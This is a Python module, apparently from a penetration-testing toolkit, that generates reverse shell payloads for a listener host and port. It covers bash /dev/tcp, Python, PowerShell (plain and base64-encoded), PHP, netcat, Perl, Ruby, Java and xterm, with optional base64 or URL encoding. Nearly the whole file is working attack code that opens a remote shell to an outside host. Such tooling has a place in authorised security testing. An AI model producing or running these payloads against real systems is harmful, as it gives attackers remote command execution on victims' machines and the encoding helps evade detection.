"""
Reverse Shell Payload Generator
Generate various reverse shell payloads for different platforms
"""

import base64
import urllib.parse
from core.module_base import ModuleBase, ModuleType, Platform


class ReverseShellGenerator(ModuleBase):
    """
    Generate reverse shell payloads for various platforms and languages.
    Supports: bash, python, powershell, php, nc, perl, ruby, etc.
    """

    def __init__(self):
        super().__init__()
        self.name = "reverse_shells"
        self.description = "Generate reverse shell payloads for various platforms"
        self.author = "UwU Toolkit"
        self.version = "1.0.0"
        self.module_type = ModuleType.AUXILIARY
        self.platform = Platform.ANY
        self.tags = ["payload", "reverse", "shell", "generator", "linux", "windows"]
        self.references = [
            "https://www.revshells.com/",
            "https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet"
        ]

        # Options
        self.register_option("LHOST", "Listener IP address", required=True)
        self.register_option("LPORT", "Listener port", required=True, default="4444")
        self.register_option("SHELL_TYPE", "Type of shell payload",
                           default="bash",
                           choices=["bash", "bash_tcp", "python", "python3",
                                   "powershell", "powershell_b64", "php", "nc",
                                   "nc_mkfifo", "perl", "ruby", "java", "xterm",
                                   "all"])
        self.register_option("ENCODE", "Encode payload (base64, url, none)",
                           default="none", choices=["none", "base64", "url"])
        self.register_option("OUTPUT", "Output file (optional)", default="")

    def run(self) -> bool:
        lhost = self.get_option("LHOST")
        lport = self.get_option("LPORT")
        shell_type = self.get_option("SHELL_TYPE")
        encode = self.get_option("ENCODE")
        output_file = self.get_option("OUTPUT")

        self.print_status(f"Listener: {lhost}:{lport}")
        self.print_status(f"Shell Type: {shell_type}")
        self.print_line()

        # Generate payloads
        if shell_type == "all":
            payloads = self._generate_all(lhost, lport)
        else:
            payload = self._generate_payload(shell_type, lhost, lport)
            if payload:
                payloads = {shell_type: payload}
            else:
                self.print_error(f"Unknown shell type: {shell_type}")
                return False

        # Apply encoding
        if encode != "none":
            for name, payload in payloads.items():
                payloads[name] = self._encode_payload(payload, encode)

        # Display payloads
        self._display_payloads(payloads)

        # Save to file if specified
        if output_file:
            self._save_payloads(payloads, output_file)

        return True

    def _generate_payload(self, shell_type: str, lhost: str, lport: str) -> str:
        """Generate a specific shell payload"""
        payloads = {
            "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",

            "bash_tcp": f"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'",

            "python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",

            "python3": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'",

            "powershell": f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",

            "powershell_b64": self._powershell_base64(lhost, lport),

            "php": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",

            "nc": f"nc -e /bin/sh {lhost} {lport}",

            "nc_mkfifo": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",

            "perl": f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",

            "ruby": f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",

            "java": f"r = Runtime.getRuntime()\np = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{lhost}/{lport};cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[])\np.waitFor()",

            "xterm": f"xterm -display {lhost}:1",
        }

        return payloads.get(shell_type, "")

    def _powershell_base64(self, lhost: str, lport: str) -> str:
        """Generate base64 encoded PowerShell reverse shell"""
        ps_payload = f"""$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()"""

        # UTF-16LE encode for PowerShell
        encoded = base64.b64encode(ps_payload.encode('utf-16le')).decode()
        return f"powershell -nop -enc {encoded}"

    def _generate_all(self, lhost: str, lport: str) -> dict:
        """Generate all payload types"""
        types = ["bash", "bash_tcp", "python", "python3", "powershell",
                "powershell_b64", "php", "nc", "nc_mkfifo", "perl", "ruby"]
        return {t: self._generate_payload(t, lhost, lport) for t in types}

    def _encode_payload(self, payload: str, encode: str) -> str:
        """Encode payload"""
        if encode == "base64":
            return base64.b64encode(payload.encode()).decode()
        elif encode == "url":
            return urllib.parse.quote(payload)
        return payload

    def _display_payloads(self, payloads: dict) -> None:
        """Display payloads in formatted output"""
        for name, payload in payloads.items():
            self.print_line()
            self.print_good(f"=== {name.upper()} ===")
            self.print_line(payload)

    def _save_payloads(self, payloads: dict, filename: str) -> None:
        """Save payloads to file"""
        try:
            with open(filename, 'w') as f:
                for name, payload in payloads.items():
                    f.write(f"# {name}\n")
                    f.write(f"{payload}\n\n")
            self.print_good(f"Payloads saved to: {filename}")
        except Exception as e:
            self.print_error(f"Failed to save: {e}")

    def check(self) -> bool:
        return True
